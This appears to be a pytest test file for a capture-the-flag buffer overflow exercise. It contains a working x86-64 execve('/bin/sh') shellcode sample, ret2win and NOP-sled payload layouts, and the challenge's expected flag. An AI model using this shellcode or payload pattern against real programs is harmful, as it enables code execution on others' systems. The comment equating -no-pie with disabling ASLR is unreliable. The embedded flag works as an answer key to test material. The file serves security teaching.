"""
Tests for Buffer Overflow Basics challenge.
Tests payload construction and exploit logic.
"""
import struct
import pytest


class TestPayloadConstruction:
    """Tests for buffer overflow payload construction."""

    def test_padding_size(self):
        """Test that padding is correct size."""
        # 64 bytes buffer + 8 bytes saved RBP = 72 bytes
        buffer_size = 64
        saved_rbp_size = 8
        expected_padding = buffer_size + saved_rbp_size

        padding = b"A" * 72
        assert len(padding) == expected_padding

    def test_ret2win_payload_structure(self):
        """Test ret2win payload structure."""
        PRINT_FLAG_ADDR = 0x401186

        # Padding
        padding = b"A" * 72

        # Return address (little-endian)
        ret_addr = struct.pack("<Q", PRINT_FLAG_ADDR)

        payload = padding + ret_addr

        # Verify structure
        assert len(payload) == 72 + 8  # padding + address
        assert payload[:72] == padding

    def test_return_address_endianness(self):
        """Test that return address is little-endian."""
        addr = 0x401186
        packed = struct.pack("<Q", addr)

        # Little-endian: least significant byte first
        assert packed[0] == 0x86
        assert packed[1] == 0x11
        assert packed[2] == 0x40
        assert packed[3] == 0x00

    def test_address_packing_size(self):
        """Test that addresses are packed to 8 bytes (64-bit)."""
        addr = 0x401186
        packed = struct.pack("<Q", addr)
        assert len(packed) == 8


class TestShellcodeConstruction:
    """Tests for shellcode payload construction."""

    SAMPLE_SHELLCODE = (
        b"\x48\x31\xf6"                  # xor rsi, rsi
        b"\x48\x31\xd2"                  # xor rdx, rdx
        b"\x48\x31\xc0"                  # xor rax, rax
        b"\x48\xbb\x2f\x62\x69\x6e"      # mov rbx, "/bin/sh"
        b"\x2f\x73\x68\x00"              #
        b"\x53"                          # push rbx
        b"\x48\x89\xe7"                  # mov rdi, rsp
        b"\xb0\x3b"                      # mov al, 59
        b"\x0f\x05"                      # syscall
    )

    def test_shellcode_length(self):
        """Test shellcode fits in buffer."""
        # Buffer is 64 bytes
        assert len(self.SAMPLE_SHELLCODE) <= 64

    def test_shellcode_contains_bin_sh(self):
        """Test shellcode contains /bin/sh string."""
        assert b"/bin/sh" in self.SAMPLE_SHELLCODE

    def test_nop_sled_construction(self):
        """Test NOP sled construction."""
        nop_sled = b"\x90" * 30
        assert len(nop_sled) == 30
        assert all(b == 0x90 for b in nop_sled)

    def test_shellcode_payload_layout(self):
        """Test shellcode payload layout."""
        nop_sled = b"\x90" * 30
        shellcode = self.SAMPLE_SHELLCODE
        total_padding = 72
        padding_after = total_padding - len(nop_sled) - len(shellcode)
        padding = b"A" * padding_after

        # Layout should fit exactly
        assert len(nop_sled) + len(shellcode) + padding_after == total_padding


class TestAddressCalculation:
    """Tests for buffer address calculations."""

    def test_buffer_address_offset(self):
        """Test return address offset into buffer."""
        buffer_addr = 0x7fffffffdc70
        nop_sled_size = 30
        offset_into_nops = 15

        ret_addr = buffer_addr + offset_into_nops

        # Should point into NOP sled
        assert ret_addr > buffer_addr
        assert ret_addr < buffer_addr + nop_sled_size

    def test_address_is_aligned(self):
        """Test that typical buffer addresses are aligned."""
        # Stack is typically 16-byte aligned
        buffer_addr = 0x7fffffffdc70
        assert buffer_addr % 16 == 0


class TestBufferOverflowFlag:
    """Tests for expected flag format."""

    def test_flag_format(self):
        """Test that expected flag matches CTF format."""
        expected_flag = "CTF{buff3r_0v3rfl0w_sh3llc0d3_m4st3r}"

        assert expected_flag.startswith("CTF{")
        assert expected_flag.endswith("}")
        assert "buffer" in expected_flag.lower() or "buff3r" in expected_flag.lower()


class TestExploitLogic:
    """Tests for exploit logic validation."""

    def test_ret2win_overwrites_return(self):
        """Test that ret2win overwrites return address correctly."""
        # The return address is at offset 72 (64 buffer + 8 saved RBP)
        buffer_offset = 64
        saved_rbp_offset = 8
        ret_addr_offset = buffer_offset + saved_rbp_offset

        assert ret_addr_offset == 72

    def test_stack_frame_layout(self):
        """Test understanding of stack frame layout."""
        # | buffer (64 bytes) | saved RBP (8 bytes) | return address (8 bytes) |
        layout = {
            'buffer_start': 0,
            'buffer_end': 64,
            'saved_rbp_start': 64,
            'saved_rbp_end': 72,
            'return_addr_start': 72,
            'return_addr_end': 80
        }

        assert layout['buffer_end'] - layout['buffer_start'] == 64
        assert layout['saved_rbp_end'] - layout['saved_rbp_start'] == 8
        assert layout['return_addr_end'] - layout['return_addr_start'] == 8


class TestPwntoolsPayload:
    """Tests for pwntools-style payload construction."""

    def test_p64_function(self):
        """Test 64-bit packing (equivalent to pwn.p64)."""
        addr = 0x401186
        packed = struct.pack("<Q", addr)

        # Should be 8 bytes
        assert len(packed) == 8

        # Should unpack to same value
        unpacked = struct.unpack("<Q", packed)[0]
        assert unpacked == addr

    def test_cyclic_pattern_generation(self):
        """Test cyclic pattern for offset discovery."""
        # Simple cyclic pattern (not actual pwntools cyclic)
        pattern = b"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA"

        # Pattern should be unique enough to find offset
        assert len(pattern) >= 48


class TestBinarySecurityFlags:
    """Tests for binary security compilation flags."""

    def test_no_stack_protector_flag(self):
        """Test understanding of stack protector flag."""
        # -fno-stack-protector disables canaries
        flag = "-fno-stack-protector"
        assert "no-stack-protector" in flag

    def test_execstack_flag(self):
        """Test understanding of execstack flag."""
        # -z execstack allows code execution on stack
        flag = "-z execstack"
        assert "execstack" in flag

    def test_no_pie_flag(self):
        """Test understanding of PIE flag."""
        # -no-pie disables Address Space Layout Randomization
        flag = "-no-pie"
        assert "no-pie" in flag
